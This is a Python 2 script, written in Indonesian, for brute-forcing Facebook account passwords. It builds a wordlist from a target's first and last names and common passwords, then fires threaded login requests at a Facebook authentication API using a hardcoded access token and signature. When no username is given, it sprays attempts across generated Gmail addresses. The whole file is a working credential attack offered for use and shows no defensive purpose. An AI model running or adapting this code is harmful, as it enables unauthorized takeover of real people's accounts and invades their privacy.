# -*- coding UTF-8 -*-
#  Author : Iqbal Dev
#  Tools : Geli2 Efbeh
#  Versi : 0.5

from prettytable import PrettyTable
from multiprocessing.pool import Process, ThreadPool
from useragents import user_agents, string1, string2, deviv, divev
import os, sys, time, requests, json

s = '\n  \033[92;1m         Suksess... \n        Password Found '
multi_dev = []
sandi = []

def Wordlist():

	try:
		print string1
		print "\033[96;1m        B U A T   W O R D L I $ T "
		print '\033[92;1m+'+'-'*38+'+' 
		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
		if nama1 == '' or nama2 == '':
			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
		d = nama1.replace(' ', '').replace('  ', '')
		b = nama2.replace(' ', '').replace('  ', '')
		lis = ['123','12345','321']
		# ////////////////////////////////////////////
		for dev in lis:
			sandi.append(nama1+dev)
		for dev in lis:
			sandi.append(nama2+dev)
		sandi.append('sayang')
		sandi.append('anjing')
		sandi.append('Sayang')
		sandi.append('Sayang1')
		sandi.append('Sayang2')
		sandi.append('Sayang3')
		sandi.append('Sayang12')
		sandi.append('Sayang123')
		sandi.append('Sayang1234')
		sandi.append('Sayang12345')
		sandi.append('dinda1')
		sandi.append('inda2')
		sandi.append('dinda3')
		sandi.append('dinda4')
		sandi.append('dinda5')
		sandi.append('dinda12')
		sandi.append('dinda123')
		sandi.append('dinda1234')
		sandi.append('dinda12345')
		sandi.append('Dinda1')
		sandi.append('Dinda2')
		sandi.append('Dinda3')
		sandi.append('Dinda4')
		sandi.append('Dinda5')
		sandi.append('Dinda12')
		sandi.append('Dinda123')
		sandi.append('Adinda1234')
		sandi.append('Adinda1')
 		sandi.append('Adinda2')
		sandi.append('Adinda3')
		sandi.append('Adinda4')
		sandi.append('Adinda12')
		sandi.append('Adinda123')
		sandi.append('Adinda1234')
		sandi.append('Adinda12345')
		sandi.append('Adinda5')
		sandi.append('Adinda')
		sandi.append('Rio1')
		sandi.append('Rio2')
		sandi.append('Rio3')
		sandi.append('Rio4')
		sandi.append('Rio5')
		sandi.append('Rio12')
		sandi.append('Rio123')
		sandi.append('Rio1234')
		sandi.append('Rio12345')
		sandi.append('adam1')
	except KeyboardInterrupt:
		print "\n Keluar.... "

	print " \n\033[92;1m   Suksess Membuat Wordlist..."
		
user1 = []

def target():
	global target
	print string2
	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")	
	if '08' not in user and '+62' not in user and '.' not in user and '1000' not in user and 'www.facebook.com' not in user and 'web.facebook.com' not in user or '@' in user[0]:
		print '\033[91;1m+'+'-'*38+'+'
		print "\033[97;1m Masukkin Username Lol, Bukan Nama orangnya..\n Tapi gk pp lah, kamu masih bisa crack \n Walaupun Tidak Bertarget.."
		print '\033[91;1m+'+'-'*38+'+'
		gm = user.replace(' ', '').replace('@', '')
		for dev in range(1, 51):
			user1.append(gm+str(dev)+'@gmail.com')
		print "\n\033[92;1m Cracking Berjalan.......\n"
		h_sandi = [sandi[0], sandi[1]]
		def br_dev(usr):
			for pas in h_sandi:
			  try:
				wak = time.ctime()
				sys.stdout.write("\r \033[95;1m" + pas + '  |  \033[97;1m' + usr )
				dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+usr+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				dev_id = dev.content
				jsl = json.loads(dev_id)
				if "session_key" in dev_id or "www.facebook.com" in jsl["error_msg"]:
				
					x = PrettyTable()
					print 
					print s
					x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
					x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
					print '\033[97;1m'
					print x
				
					print('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n Tekan CTRL Z Untuk Berhenti...\n')
				  	
			  except requests.exceptions.ConnectionError:
				  	exit(' Gangguan Koneksi Internet\n Keluarrr....')
			  except KeyError:
			  	print " "


		def crk():
			th_dev = ThreadPool(30)
			th_dev.map(br_dev, user1)
			divev()
			deviv()
		crk() 
		exit('\n\n     Done .... \n')


	print '+'+'-'*38+'+'
	pasw = open('user.txt', 'w')
	pasw.write(user)
	pasw.close() 
	

def br_dev1(paswq):
	user = open('user.txt', 'r').read()
	wak = time.ctime()
	pas = paswq.replace('\n', '')
	print '\033[96;1m ' + wak + " \033[95;1m" + pas 
	usr = user.replace('https://www.facebook.com/', '').replace('https://web.facebook.com/', '')
	dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+usr+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	dev_id = dev.content
	jsl = json.loads(dev_id)
	if "session_key" in dev_id or "www.facebook.com" in jsl["error_msg"]:
	  try:
		x = PrettyTable()
		print s
		x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
		x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
		print '\033[97;1m'
		print x
		divev()
		deviv()
		raw_input('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n Tekan CTRL Z Untuk Berhenti...\n')
		
	  except:
	  	pass

	
	

def brute():
	Wordlist()
	target()
	dev = ThreadPool(8)
	dev.map(br_dev1, sandi)
	divev()
	deviv()
	print '\n\033[92;1m    Selesai Broo..... \n  '


